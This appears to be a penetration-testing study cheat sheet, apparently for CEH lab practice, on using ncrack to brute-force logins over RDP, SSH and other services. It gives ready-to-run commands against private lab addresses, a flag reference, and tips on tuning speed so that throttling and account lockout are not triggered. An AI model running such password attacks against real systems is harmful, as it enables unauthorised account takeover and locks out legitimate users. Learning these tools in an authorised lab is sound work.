# ncrack — High-speed network auth cracker (nmap project)

> **Purpose-built for auth brute-forcing**, especially RDP (where hydra/medusa are weak). Supports SSH, RDP, FTP, Telnet, HTTP(S), POP3, IMAP, SMB, VNC, MySQL, MSSQL, PostgreSQL, SIP, Redis, and more.

**Install check (Parrot):** `ncrack -V` (install: `sudo apt install ncrack`).

---

## 🎯 Cheat-flow

| Goal | Command |
|---|---|
| **RDP brute** (Win7 target) | `ncrack -vv --user Administrator -P pass.txt rdp://192.168.52.130` |
| SSH brute | `ncrack -vv --user msfadmin -P rockyou.txt ssh://192.168.52.129` |
| Multi-service | `ncrack -vv -U users.txt -P pass.txt 192.168.52.130:3389 192.168.52.129:22` |
| Custom port SSH | `ncrack -vv --user root -P pass.txt ssh://192.168.52.129:2222` |
| Stop on first | `ncrack --user admin -P pass.txt -f rdp://192.168.52.130` |
| Save output | `ncrack --user admin -P pass.txt rdp://192.168.52.130 -oN out.txt` |
| Resume paused | `ncrack --resume ncrack.restore` |

---

## 🔑 Flags

| Flag | Meaning |
|---|---|
| `--user <u>` | Single username |
| `-U <file>` | User list |
| `--pass <p>` | Single password |
| `-P <file>` | Password list |
| `-p <service>:<port>` | Port override |
| `-T<0-5>` | Timing template (0=paranoid, 5=insane) |
| `-f` | Stop on first success per service |
| `-vv` / `-d` | Verbose / debug |
| `-oN <f>` | Normal output |
| `-oX <f>` | XML output |
| `--resume <file>` | Resume state |
| `-g CL=<n>,CR=<n>` | Connection limits |

Service syntax: `protocol://host[:port]` (e.g. `rdp://192.168.52.130`, `ssh://host:2222`).

---

## ⚡ CEH RDP pattern (the reason to use ncrack)

```bash
ncrack -vv --user Administrator -P /usr/share/wordlists/rockyou.txt rdp://192.168.52.130 -T4
```

If found: `Discovered credentials for rdp on 192.168.52.130:3389: Administrator <password>`.

---

## ⚠️ Gotchas

- **RDP rate limiting:** Windows throttles after several failures — use `-T3` or lower, or add `-g CL=1,CR=1`.
- **NLA (Network Level Auth):** newer Windows may require NLA enabled; ncrack supports it but older versions may fail silently.
- **Account lockout policy** on Win7/domain = guaranteed lockout if you spray too hard. Test on one account, read output, then decide.
- Smaller wordlist = faster. Start with top-100, expand.
- ncrack output is less colorful than hydra — read `Discovered credentials` lines carefully.

---

## 🧠 ncrack vs hydra vs medusa

| Service | Best |
|---|---|
| **RDP** | ncrack |
| HTTP form | hydra |
| SSH | any (medusa/hydra often faster) |
| VNC | ncrack |
| SMB | hydra or crackmapexec |

---

## 📖 See also
- [hydra.md](hydra.md)
- [medusa.md](medusa.md)
- [crackmapexec.md](crackmapexec.md)
